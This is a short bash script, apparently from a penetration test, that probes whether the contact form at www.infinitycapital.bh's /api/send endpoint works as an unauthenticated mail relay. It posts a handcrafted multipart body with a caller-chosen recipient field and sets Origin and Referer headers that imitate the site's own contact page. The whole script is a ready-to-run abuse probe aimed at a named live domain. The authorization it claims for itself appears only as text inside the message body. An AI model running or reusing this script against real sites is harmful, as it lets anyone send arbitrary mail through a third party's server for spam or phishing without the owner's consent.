#!/bin/bash
# Independent A/B verification of unauthenticated relay at POST /api/send
# Both requests are BYTE-IDENTICAL except the `targets` (recipient) field.
TARGETS="$1"
LABEL="$2"
OUT="/work/evidence/relay_${LABEL}.out"
HDR="/work/evidence/relay_${LABEL}.hdr"

# Build a canonical multipart/form-data body WITHOUT boundary from other tools
BODY=$(printf -- '--BND\r\nContent-Disposition: form-data; name="fname"\r\n\r\nIVRelay\r\n--BND\r\nContent-Disposition: form-data; name="lname"\r\n\r\nVerifier\r\n--BND\r\nContent-Disposition: form-data; name="areacode"\r\n\r\n0\r\n--BND\r\nContent-Disposition: form-data; name="tel"\r\n\r\n0000000\r\n--BND\r\nContent-Disposition: form-data; name="cname"\r\n\r\nSecurityAuditBot\r\n--BND\r\nContent-Disposition: form-data; name="subject"\r\n\r\nWebsite Contact Submission\r\n--BND\r\nContent-Disposition: form-data; name="msg"\r\n\r\nIndependent authorized security verification of contact form relay. No data exfiltration.\r\n--BND\r\nContent-Disposition: form-data; name="check"\r\n\r\n0\r\n--BND\r\nContent-Disposition: form-data; name="targets"\r\n\r\n%s\r\n--BND--\r\n' "$TARGETS")

echo "===== $LABEL  targets=$TARGETS ====="
curl -sS -o "$OUT" -D "$HDR" -w "HTTP=%{http_code} bytes=%{size_download} time=%{time_total}\n" \
  --max-time 45 \
  -H "Content-Type: multipart/form-data; boundary=BND" \
  -H "Origin: https://www.infinitycapital.bh" \
  -H "Referer: https://www.infinitycapital.bh/contact" \
  --data-binary "$BODY" \
  https://www.infinitycapital.bh/api/send
echo "BODY: $(cat $OUT)"
echo
